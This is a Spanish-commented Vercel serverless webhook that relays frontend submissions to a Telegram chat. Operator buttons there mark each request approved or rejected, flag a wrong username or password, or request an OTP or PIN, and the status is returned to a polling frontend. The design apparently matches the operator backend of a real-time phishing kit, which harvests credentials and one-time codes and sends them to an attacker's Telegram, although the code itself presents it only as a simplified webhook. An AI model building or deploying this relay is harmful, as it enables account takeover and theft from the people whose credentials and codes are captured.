// api/webhook.js - WEBHOOK SIMPLIFICADO

// Las credenciales se toman de variables de entorno en Vercel
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Almacenamiento temporal en memoria (se reinicia en cada deploy)
if (!global.peticiones) {
    global.peticiones = new Map();
}

export default async function handler(req, res) {
    // Configurar CORS para que el frontend pueda llamar
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Responder a preflight (OPTIONS)
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Verificar que las variables de entorno estén configuradas
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Faltan variables de entorno');
        return res.status(500).json({ 
            error: 'Configuración incompleta',
            mensaje: 'TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID son requeridos'
        });
    }

    // ============================================
    // GET - Verificar estado del webhook
    // ============================================
    if (req.method === 'GET') {
        const { check, setup } = req.query;

        // Configurar webhook en Telegram
        if (setup === 'true') {
            try {
                const protocol = req.headers['x-forwarded-proto'] || 'https';
                const host = req.headers.host;
                const webhookUrl = `${protocol}://${host}/api/webhook`;
                
                console.log('🔗 Configurando webhook en:', webhookUrl);

                // Eliminar webhook anterior
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`);
                
                // Configurar nuevo webhook
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: webhookUrl,
                        allowed_updates: ['callback_query', 'message']
                    })
                });

                const data = await response.json();
                
                return res.status(200).json({
                    success: true,
                    webhookUrl: webhookUrl,
                    telegramResponse: data
                });
            } catch (error) {
                return res.status(500).json({ 
                    error: 'Error configurando webhook',
                    detalle: error.message 
                });
            }
        }

        // Verificar estado de una petición
        if (check) {
            const peticion = global.peticiones.get(check);
            return res.status(200).json({
                id: check,
                estado: peticion?.estado || 'pending',
                mensaje: peticion?.mensaje || 'Esperando respuesta'
            });
        }

        // Información del webhook
        return res.status(200).json({
            mensaje: 'Webhook activo',
            endpoints: {
                'GET ?setup=true': 'Configurar webhook',
                'GET ?check=ID': 'Verificar estado',
                'POST': 'Recibir mensajes del frontend'
            }
        });
    }

    // ============================================
    // POST - Recibir mensajes
    // ============================================
    if (req.method === 'POST') {
        try {
            const body = req.body;
            console.log('📨 Mensaje recibido');

            // ============================================
            // CASO 1: Frontend envía mensaje
            // ============================================
            if (body.mensaje && body.id) {
                console.log('📤 Enviando a Telegram - ID:', body.id);

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: body.mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: body.botones || undefined,
                        disable_web_page_preview: true
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    // Guardar estado de la petición
                    global.peticiones.set(body.id, {
                        estado: 'pending',
                        mensaje: 'Esperando respuesta',
                        timestamp: Date.now()
                    });

                    return res.status(200).json({
                        success: true,
                        id: body.id,
                        mensaje: 'Mensaje enviado a Telegram'
                    });
                } else {
                    console.error('❌ Error Telegram:', data.description);
                    return res.status(500).json({
                        success: false,
                        error: data.description
                    });
                }
            }

            // ============================================
            // CASO 2: Botón presionado en Telegram
            // ============================================
            if (body.callback_query) {
                const callback = body.callback_query;
                const callbackId = callback.id;
                const callbackData = callback.data;
                const message = callback.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const textoOriginal = message.text || '';

                console.log('🔘 Botón presionado:', callbackData);

                // Extraer acción e ID
                const partes = callbackData.split('_');
                const accion = partes[0];
                const id = partes.slice(1).join('_');

                let respuesta = '';
                let estado = '';
                let mensajeEstado = '';

                // Procesar diferentes acciones
                switch (accion) {
                    case 'approve':
                        respuesta = '✅ Aprobado';
                        estado = 'approved';
                        mensajeEstado = '✅ *APROBADO*';
                        break;
                    case 'reject':
                        respuesta = '❌ Rechazado';
                        estado = 'rejected';
                        mensajeEstado = '❌ *RECHAZADO*';
                        break;
                    case 'error':
                        if (callbackData.includes('user')) {
                            respuesta = '❌ Error de usuario';
                            estado = 'error_user';
                            mensajeEstado = '❌ *ERROR USUARIO*';
                        } else if (callbackData.includes('pass')) {
                            respuesta = '❌ Error de contraseña';
                            estado = 'error_pass';
                            mensajeEstado = '❌ *ERROR CONTRASEÑA*';
                        }
                        break;
                    case 'aprobar':
                        respuesta = '✅ Aprobado';
                        estado = 'approved';
                        mensajeEstado = '✅ *APROBADO*';
                        break;
                    case 'rechazar':
                        respuesta = '❌ Rechazado';
                        estado = 'rejected';
                        mensajeEstado = '❌ *RECHAZADO*';
                        break;
                    case 'pedir':
                        if (callbackData.includes('otp')) {
                            respuesta = '📱 OTP solicitado';
                            estado = 'otp_requested';
                            mensajeEstado = '📱 *OTP SOLICITADO*';
                        } else if (callbackData.includes('clave')) {
                            respuesta = '🔑 Clave solicitada';
                            estado = 'clave_requested';
                            mensajeEstado = '🔑 *CLAVE SOLICITADA*';
                        }
                        break;
                    default:
                        respuesta = '⚠️ Procesado';
                        estado = 'processed';
                        mensajeEstado = '⚠️ *PROCESADO*';
                }

                // Responder al callback
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: respuesta,
                        show_alert: false
                    })
                });

                // Actualizar mensaje en Telegram
                let nuevoTexto = textoOriginal;
                const regexEstado = /⏳ \*Estado:\* .+/;
                if (regexEstado.test(nuevoTexto)) {
                    nuevoTexto = nuevoTexto.replace(regexEstado, `⏳ *Estado:* ${mensajeEstado}`);
                } else {
                    nuevoTexto += `\n\n⏳ *Estado:* ${mensajeEstado}`;
                }

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: nuevoTexto,
                        parse_mode: 'Markdown'
                    })
                });

                // Guardar estado
                if (id) {
                    global.peticiones.set(id, {
                        estado: estado,
                        mensaje: mensajeEstado,
                        timestamp: Date.now()
                    });
                    console.log(`✅ Petición ${id}: ${estado}`);
                }

                return res.status(200).json({
                    success: true,
                    accion: estado,
                    id: id
                });
            }

            // Otros tipos de mensajes
            return res.status(200).json({ 
                success: true, 
                mensaje: 'Recibido' 
            });

        } catch (error) {
            console.error('❌ Error:', error);
            return res.status(500).json({ 
                error: 'Error interno',
                detalle: error.message 
            });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
